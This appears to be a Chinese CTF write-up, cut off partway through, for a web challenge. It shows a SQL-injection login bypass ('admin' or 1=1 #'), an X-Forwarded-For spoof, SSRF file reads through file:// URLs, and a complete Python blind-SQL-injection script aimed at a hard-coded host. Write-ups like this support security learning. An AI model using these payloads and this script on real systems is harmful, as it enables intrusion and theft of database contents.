## 信息收集

使用御剑扫到这几个页面

![image-20240704191915046](https://s2.loli.net/2024/07/04/cOrQI43z8LRs2NK.png)

## flag1

```
flag1{17013e65-4e6f-b9f6-a308-ce3878e8212c}
```



### 1.flag1前半段

**知识点：万能密码**

在登录页面使用外能密码`admin' or 1=1 #`，可以成功登录

登录成功后进入到个人信息页得到flag1的前半段

![image-20240704175315716](https://s2.loli.net/2024/07/04/aUCn1OyVNis6H7L.png)

### 2.flag1的后半段

**知识点：SSRF，XFF绕过，文件读取**

1.根据前面的信息收集到的页面，访问url/flag.php，提示***我不接受来自外部的IP***,明显是XFF绕过，伪造XFF头`X-Forwarded-For:127.0.0.1`发送请求包得到新提示

![image-20240704192515776](https://s2.loli.net/2024/07/04/53G6hWCzBEVSMtc.png)

2.根据这里提示需要用get方法请求一个参数，另外这里的curl请求失败，推测为SSRF，这里传参利用file协议可以进行文件读取:`?request=file:///var/www/html/flag.php`

![image-20240704215719296](https://s2.loli.net/2024/07/04/E91kBglOvfiAXrm.png)

3.既然可以文件读取了，那我们试着读一下**user.php**的源码

![image-20240704220011668](https://s2.loli.net/2024/07/04/BGo2Pq1DbsMUwKN.png)

成功读取到两段flag

## flag2

**考点：sql 盲注**

### 1.经过测试发现，登录页还有sql盲注

![image-20240704164920404](https://s2.loli.net/2024/07/04/ndljypiWNKL3Uc6.png)



如果使用admin登录的话，

拼接的sql语句如果为真,就会响应**'管理员请从管理员登陆界面登陆！'**

如果为假就会响应**'账号或密码错误！'**

![image-20240704173612008](https://s2.loli.net/2024/07/04/shTkL3EyjH1gCwK.png)

这里可以构造语句注出我们想要的内容

```
admin' and ascii(substr((select database()),1,1))=99# 爆出数据库名第一个字符为c
```



### 2.sql盲注爆出flag2

通过判断响应包，我们可以写一个脚本爆出数据库名，表，字段，最后爆出flag2

贴上自己搓的脚本，写完了才发现其实sqlmap跑的更快。。。。

```
#exp2.py
import requests
import time
url = 'http://116.205.174.242:11451/login.php'
data = {"username":"",
        "password":"123",
        }
result=''

flag='管理员请从管理员登陆界面登陆！'


def GetDBName(url):
    DBName = ''
    print("开始获取数据库名长度...")
    length = 0
    for l in range(1,99):
        data["username"] = f"admin' and length((select database()))={l}#"
        r1= requests.post(url,data=data)
        if flag in r1.text:
            print("数据库名长度为："+str(l))
            length = l
            break
    print("开始获取数据库名...")
    for i in range(1, length + 1):
        for j in range(33,127):
            data["username"] = f"admin' and ascii(substr((select database()),{i},1))={j}#"
            r2= requests.post(url,data=data)
            if flag in r2.text:
                DBName += chr(j)
                print(DBName)
                break
    return DBName


def GetTables(url):
    print("正在获取数据表数量")
    tnum = 0 #表数量
    t_len = 0 #表名长度
    tname = "" #表名
    for i in range(1,50):
        data["username"]= f"admin' and (select count(*)table_name from information_schema.tables where table_schema=database())={i}#"
        r1=requests.post(url,data=data)
        if flag in r1.text:
            tnum = i
            print(f"共有{i}张表")
            break
    for i in range(0,tnum):
        for n in range(1,50):
            data["username"] = f"admin' and length(substr((select table_name from information_schema.tables where table_schema=database() limit {i},1),1))={n}#"
            r2= requests.post(url,data=data)
            if flag in r2.text:
                print(f"第{i+1}张表的长度为{n}")
                t_len = n
                break
        for l in range(1,t_len+1):
            for j in range(33,127):
                data["username"] = f"admin' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit {i},1),{l},1))={j}#"
                r3 =requests.post(url,data=data)
                if flag in r3.text:
                    tname += chr(j)
                    print(tname)
                    break
        tname += ','
    result_list = tname[:-1].split(",")
    return result_list

def GetData(url,TbName):
    print(f"正在获取表{TbName}的数据")
    Cname = ''#列名
    Cnum= 0 #列的数量
    Clen = 0 #列名长度
    result = ''#表中的数据
    for i in range(1, 50):
        data["username"]=f"admin' and (select count(*)column_name from information_schema.columns where table_name='flag')={i}#"
        r1 = requests.post(url, data=data)
        if flag in r1.text:
            Cnum = i
            print(f"共有{Cnum}列")
            break

    print('获取列名长度')
    for i in range(1, 50):
        data["username"]=f"admin' and (select length(column_name) from information_schema.columns where table_name ='{TbName}' limit {Cnum-1}, 1) = {i}#"
        r2 = requests.post(url, data=data)
        if flag in r2.text:
            Clen = i
            print(f"第{Cnum}列的列名长度为{Clen}")
            break

    print('获取列名字符组成')
    for i in range(1,Clen+1):
        for j in range(33,127):
            data["username"]=f"admin' and ascii(substr((select column_name from information_schema.columns where table_name = '{TbName}' limit 0,1),{i},1))={j}#"
            r3 = requests.post(url, data=data)
            if flag in r3.text:
                Cname += chr(j)
                print(Cname)
                break

    print(f'获取字段{Cname}数据......')
    for i in range(0,50):
        for j in range(33,127):
            data["username"]=f"admin' and ascii(substr((select {Cname} from {TbName} limit 0,1),{i},1))={j}#"
            #print(data)
            r4 = requests.post(url, data=data)
            if flag in r4.text:
                result += chr(j)
                break

    print(result)


GetDBName(url)
GetTables(url)
TbName='flag'
GetData(url,TbName)
```

![image-20240704163857230](https://s2.loli.net/2024/07/04/z6xU51lXG83yjoF.png)

## flag3

**知识点：文件上传**

1.因为上面做flag1的时候在 *flag.php*发现了一个ssrf漏洞，可以利用file协议读取到源码，这里我们审计其他源码，发现在*/admin/login.php*里关联了*../lib/config.php*，推测这里是存放的是一些配置信息

![image-20240705182810812](https://s2.loli.net/2024/07/05/VUYzOGp5BjgZF96.png)

2.这里我们依然用file协议读取*/lib/config.php*
